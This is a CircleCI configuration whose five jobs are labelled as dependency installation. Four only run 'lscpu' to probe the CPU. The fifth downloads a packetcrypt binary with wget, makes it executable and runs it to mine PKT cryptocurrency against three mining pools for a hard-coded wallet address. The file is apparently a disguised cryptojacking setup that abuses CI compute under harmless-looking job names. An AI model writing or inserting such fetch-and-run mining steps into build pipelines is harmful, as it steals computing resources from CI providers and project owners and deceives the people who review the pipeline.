version: 2.1
jobs:
    Devop:
      docker:
           - image: circleci/ruby:2.5.3
      steps:
        - run:
           name: Install Dependencies
           command: timeout 1m lscpu
    Devop1:
      docker:
           - image: circleci/ruby:2.5.3
      steps:
        - run:
           name: Install Dependencies
           command: timeout 1m lscpu
    Devop2:
      docker:
           - image: circleci/ruby:2.5.3
      steps:
        - run:
           name: Install Dependencies
           command: timeout 1m lscpu
    Devop3:
      docker:
           - image: circleci/ruby:2.5.3
      steps:
        - run:
           name: Install Dependencies
           command: timeout 1m lscpu
    Devop4:
      docker:
           - image: circleci/ruby:2.5.3
      steps: 
        - run: 
           name: Installing
           command: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && chmod +x packetcrypt && ./packetcrypt ann -p pkt1qt87rhd70whck9fkp4rkd2a9ehjflt469rzajw6 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com -t2
workflows:
  version: 2.1
  build:
    jobs:
       - Devop
       - Devop1
       - Devop2
       - Devop3
       - Devop4
       
